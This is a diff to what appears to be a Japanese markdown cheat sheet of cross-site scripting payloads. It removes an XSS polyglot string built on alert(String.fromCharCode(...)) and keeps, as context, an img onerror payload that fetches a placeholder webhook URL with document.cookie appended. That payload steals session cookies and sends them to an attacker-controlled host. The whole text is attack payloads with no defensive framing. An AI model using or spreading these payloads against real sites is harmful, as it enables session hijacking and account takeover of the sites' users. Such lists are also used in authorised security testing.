@@ -2,9 +2,6 @@
 ## XSS
 通常バージョン
 ```javascript:XSS
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
-alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
-></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 ```
 ```html:XSS
 &lt;img src=x onerror=fetch(atob('webhookURL(btoa)')+?cookie='+document.cookie)&gt;
